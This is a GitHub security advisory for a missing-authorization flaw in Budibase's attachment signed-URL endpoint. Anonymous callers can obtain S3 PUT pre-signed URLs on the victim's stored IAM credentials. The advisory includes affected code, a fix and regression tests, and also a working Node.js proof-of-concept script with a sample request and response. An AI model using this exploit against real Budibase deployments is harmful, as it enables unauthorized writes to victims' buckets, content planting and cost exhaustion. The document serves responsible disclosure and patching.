# [H] Budibase: POST /api/attachments/:datasourceId/url is unauthenticated and lets anonymous callers mint S3 PUT pre-signed URLs using stored datasource IAM credentials

## Summary
Severity: High
Advisory: GHSA-35c4-rvc8-frhm
CVE: CVE-2026-50137
CWE: CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-35c4-rvc8-frhm
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.39.0

## Details
## Summary

The Budibase server route `POST /api/attachments/:datasourceId/url` ([`packages/server/src/api/routes/static.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts)) is registered with **only** the `recaptcha` middleware. There is no `authorized(...)` middleware in the chain. The controller (`packages/server/src/api/controllers/static/index.ts::getSignedUploadURL`) looks the requested datasource up, instantiates an AWS S3 client with the datasource's stored `accessKeyId` / `secretAccessKey`, and returns an AWS Signature V4 pre-signed `PutObjectCommand` URL for the caller-supplied `bucket` and `key`. The `bucket` is not pinned to the datasource's configured bucket.

The workspace context required by `sdk.datasources.get` is sourced by `getWorkspaceIdFromCtx` ([`packages/backend-core/src/utils/utils.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/backend-core/src/utils/utils.ts)) from any of: the `x-budibase-app-id` header, the JSON body `appId`, a path segment that begins with the workspace prefix, or `?appId=`. `auth.buildAuthMiddleware([], { publicAllowed: true })` runs before any of this and explicitly allows anonymous requests. The `currentWorkspace` middleware's "deny access to dev preview" branch only triggers under `isBrowser(ctx) && !isApiKey(ctx)`; `isBrowser` checks the parsed `User-Agent` for a recognised browser, so any non-browser client (curl, the supplied PoC, any tool not setting a browser UA) is neither and reaches dev workspaces too.

Net effect: an anonymous attacker who knows or can enumerate a workspace id (`app_...`) and an S3-source datasource id (`ds_...`) can call this endpoint with no auth and obtain a 15-minute pre-signed PUT URL minted on the victim's IAM identity. The endpoint also returns the `publicUrl` so the attacker knows exactly where their PUT lands. Because `bucket` is attacker-controlled, the attacker can write to any bucket those IAM credentials can write to, not only the bucket the datasource was configured for.

## Affected code

[`packages/server/src/api/routes/static.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts) at HEAD `56d2a984` (`master`, 2026-05-18):

```ts
import { permissions } from "@budibase/backend-core"
import Router from "@koa/router"
import { authorizedMiddleware as authorized } from "../../middleware/authorized"
import recaptcha from "../../middleware/recaptcha"
import { paramResource } from "../../middleware/resourceId"
import * as controller from "../controllers/static"

const { BUILDER, PermissionType, PermissionLevel } = permissions

const router: Router = new Router()
// ...
router
  .post("/api/attachments/process", authorized(BUILDER), controller.uploadFile)
  .post("/api/pwa/process-zip", authorized(BUILDER), controller.processPWAZip)
  .post(
    "/api/attachments/:tableId/upload",
    recaptcha,
    paramResource("tableId"),
    authorized(PermissionType.TABLE, PermissionLevel.WRITE),
    controller.uploadFile
  )
  // ...
  .post(
    "/api/attachments/:datasourceId/url",
    recaptcha,
    controller.getSignedUploadURL                       // <- no authorized(...)
  )
```

Note the asymmetry: every other mutating endpoint on this router carries an `authorized(...)` middleware. The signed-URL endpoint does not.

[`packages/server/src/api/controllers/static/index.ts:595-645`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/controllers/static/index.ts#L595-L645):

```ts
export const getSignedUploadURL = async function (ctx) {
  let datasource
  try {
    const { datasourceId } = ctx.params
    datasource = await sdk.datasources.get(datasourceId, { enriched: true })
    if (!datasource) {
      ctx.throw(400, "The specified datasource could not be found")
    }
  } catch (error) {
    ctx.throw(400, "The specified datasource could not be found")
  }

  let signedUrl, publicUrl
  const awsRegion = (datasource?.config?.region || "eu-west-1") as string
  if (datasource?.source === "S3") {
    const { bucket, key } = ctx.request.body || {}
    if (!bucket || !key) {
      ctx.throw(400, "bucket and key values are required")
    }
    try {
      let endpoint = datasource?.config?.endpoint
      if (endpoint && !utils.urlHasProtocol(endpoint)) {
        endpoint = `https://${endpoint}`
      }
      const s3 = new S3({
        region: awsRegion,
        endpoint,
        credentials: {
          accessKeyId: datasource?.config?.accessKeyId as string,
          secretAccessKey: datasource?.config?.secretAccessKey as string,
        },
      })
      const params = { Bucket: bucket, Key: key }
      signedUrl = await getSignedUrl(s3, new PutObjectCommand(params))
      if (endpoint) {
        publicUrl = `${endpoint}/${bucket}/${key}`
      } else {
        publicUrl = `https://${bucket}.s3.${awsRegion}.amazonaws.com/${key}`
      }
    } catch (error: any) {
      ctx.throw(400, error)
    }
  }

  ctx.body = { signedUrl, publicUrl }
}
```

`sdk.datasources.get(datasourceId, { enriched: true })` ([`packages/server/src/sdk/workspace/datasources/datasources.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/sdk/workspace/datasources/datasources.ts)) does the workspace DB read and **also** substitutes `{{ env.* }}` references in the config via `processObjectSync`, so even if the operator stored credentials as environment-variable references, those values are resolved before the S3 client is built.

`recaptcha` ([`packages/server/src/middleware/recaptcha.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/middleware/recaptcha.ts)) short-circuits to `next()` whenever the workspace either is not a production workspace or does not have `features.recaptchaEnabled = true` on its metadata. Neither is set by default. Even on workspaces with recaptcha enabled, builders carrying the `x-budibase-type: builder` header skip the check, but that branch is irrelevant here — the broader case is that an anonymous attacker simply chooses a non-prod workspace (which is the default for any in-development app) and the middleware no-ops.

## Reproduction

Proof-of-concept Node.js script (no AWS SDK dependency, no external libraries):

```js
#!/usr/bin/env node
// PoC: Unauthenticated S3 signed-upload-URL minting in Budibase
// usage: node poc.js <budibase-base-url> <app-id> <datasource-id>

"use strict"
const http = require("http")
const https = require("https")
const { URL } = require("url")

function postJson(targetUrl, headers, body) {
  return new Promise((resolve, reject) => {
    const u = new URL(targetUrl)
    const lib = u.protocol === "https:" ? https : http
    const payload = Buffer.from(JSON.stringify(body), "utf8")
    const req = lib.request(
      {
        method: "POST",
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port || (u.protocol === "https:" ? 443 : 80),
        path: u.pathname + u.search,
        headers: Object.assign(
          {
            "Content-Type": "application/json",
            "Content-Length": payload.length,
            // Deliberately not a recognised browser UA so the
            // currentWorkspace dev-preview redirect does not fire.
            "User-Agent": "budibase-poc/1.0",
          },
          headers || {}
        ),
      },
      res => {
        const chunks = []
        res.on("data", c => chunks.push(c))
        res.on("end", () =>
          resolve({
            status: res.statusCode,
            body: Buffer.concat(chunks).toString("utf8"),
          })
        )
      }
    )
    req.on("error", reject)
    req.write(payload)
    req.end()
  })
}

async function main() {
  const [baseUrl, appId, datasourceId] = process.argv.slice(2)
  if (!baseUrl || !appId || !datasourceId) {
    console.error("usage: node poc.js <baseUrl> <appId> <datasourceId>")
    process.exit(2)
  }
  const bucket = process.env.POC_BUCKET || "attacker-chosen-bucket"
  const key = process.env.POC_KEY || `pwn/${Date.now()}.html`
  const url = baseUrl.replace(/\/$/, "") +
    `/api/attachments/${encodeURIComponent(datasourceId)}/url`
  const resp = await postJson(
    url,
    { "x-budibase-app-id": appId },
    { bucket, key }
  )
  console.log(`HTTP ${resp.status}`)
  console.log(resp.body)
}

main().catch(err => {
  console.error(err)
  process.exit(1)
})
```

Wire-level request:

```
POST /api/attachments/ds_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/url HTTP/1.1
Host: budibase.example:10000
x-budibase-app-id: app_dev_yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
Content-Type: application/json
User-Agent: budibase-poc/1.0
Content-Length: 36

{"bucket":"victim-bucket","key":"x.html"}
```

Response:

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "signedUrl": "https://victim-bucket.s3.eu-west-1.amazonaws.com/x.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA...%2F20260519%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20260519T120000Z&X-Amz-Expires=900&X-Amz-Signature=...&X-Amz-SignedHeaders=host&x-id=PutObject",
  "publicUrl": "https://victim-bucket.s3.eu-west-1.amazonaws.com/x.html"
}
```

The attacker then PUTs arbitrary bytes to `signedUrl` and they land at `publicUrl`, signed by — and IAM-scoped to — the victim's stored S3 credentials.

The existing test that exercises the endpoint, [`packages/server/src/api/routes/tests/static.spec.ts:123-146`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/tests/static.spec.ts#L123-L146), sends the same request with `config.defaultHeaders()` (a builder auth cookie). That confirms the request shape; no negative-auth test (`.set({})` or `publicHeaders()`) exists for this route, which is how the missing `authorized(...)` slipped past code review.

## Impact

- **Confidentiality / Integrity**: any anonymous internet user can write arbitrary objects to any bucket the configured IAM credentials can write to. The `bucket` parameter is attacker-controlled, so the blast radius is the full IAM policy attached to the credential, not just the bucket the operator wired into the datasource. Typical realistic outcomes: planting HTML/JS that the bucket serves at a known path (the response gives back `publicUrl`), overwriting an existing key the application later reads back as trusted data, racking up S3 storage / PUT cost.
- **Availability**: storage / cost exhaustion. Repeated PUTs of large objects to attacker-chosen keys cost the victim.
- **Authorization scope leak**: the endpoint discloses (a) whether a given `datasourceId` exists and is S3-typed (200 vs 400 'not found'), and (b) the resolved `publicUrl` which includes the region.

No MFA / OAuth / per-user check exists between the request and the issued pre-signed URL. The credentials are not returned in plaintext, but the pre-signed URL is functionally equivalent to a 15-minute capability to PUT to the chosen `bucket`/`key`.

## Suggested fix

Attach `authorized(PermissionType.TABLE, PermissionLevel.WRITE)` (or a higher gate, e.g. `BUILDER`, depending on intended audience) to the route, mirroring the sibling `/api/attachments/:tableId/upload` registration. Additionally, validate that the requested `bucket` matches `datasource.config.bucket` so the IAM blast radius is reduced to the configured bucket only.

Minimal patch shape:

```ts
.post(
  "/api/attachments/:datasourceId/url",
  recaptcha,
  paramResource("datasourceId"),
  authorized(PermissionType.TABLE, PermissionLevel.WRITE),
  controller.getSignedUploadURL
)
```

And in the controller, before calling `getSignedUrl`:

```ts
const configuredBucket = datasource?.config?.bucket
if (configuredBucket && bucket !== configuredBucket) {
  ctx.throw(400, "bucket does not match configured datasource bucket")
}
```

## Credit

Reported by `tonghuaroot` (`tonghuaroot@gmail.com`).



## Fix PR

A candidate fix has been prepared on the temporary private fork that was created from this advisory:

- PR: https://github.com/Budibase/budibase-ghsa-35c4-rvc8-frhm/pull/1
- Branch: `fix/attachment-url-auth-and-bucket-pin`
- Commit: `Require builder auth and pin bucket on POST /api/attachments/:datasourceId/url`

The patch is the canonical two-part fix:

1. Attach `authorized(BUILDER)` to `POST /api/attachments/:datasourceId/url` on [`packages/server/src/api/routes/static.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts), mirroring the surrounding `POST /api/attachments/process` and `POST /api/pwa/process-zip` registrations. Anonymous callers now receive 401 regardless of whether the `recaptcha` middleware fails open.
2. Pin `Bucket` to `datasource.config.bucket` inside `getSignedUploadURL` ([`packages/server/src/api/controllers/static/index.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/controllers/static/index.ts)) and ignore any `bucket` value supplied in the request body. If the datasource has no bucket configured, the route now returns 400 instead of issuing an unbounded pre-signed URL.

Two regression tests are added in [`packages/server/src/api/routes/tests/static.spec.ts`](https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/tests/static.spec.ts):

- `should reject unauthenticated callers` (anonymous request with `config.publicHeaders()` now returns 401, was 200 before).
- `should ignore a client-supplied bucket and pin to the datasource's configured bucket` (authenticated request with body `{ bucket: "other-bucket", key: "bar" }` returns a signed URL bound to `foo.s3.eu-west-1.amazonaws.com/bar`, not `other-bucket`).

Test run on the patch (Jest, `packages/server`):

```
PASS src/api/routes/tests/static.spec.ts
  /static
    /attachments
      generateSignedUrls
        v should be able to generate a signed upload URL
        v should reject unauthenticated callers
        v should ignore a client-supplied bucket and pin to the datasource's configured bucket
        v should reject when the datasource has no configured bucket
        v should handle an invalid datasource ID
        v should require a key parameter
```

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-35c4-rvc8-frhm
- https://nvd.nist.gov/vuln/detail/CVE-2026-50137
- https://github.com/Budibase/budibase
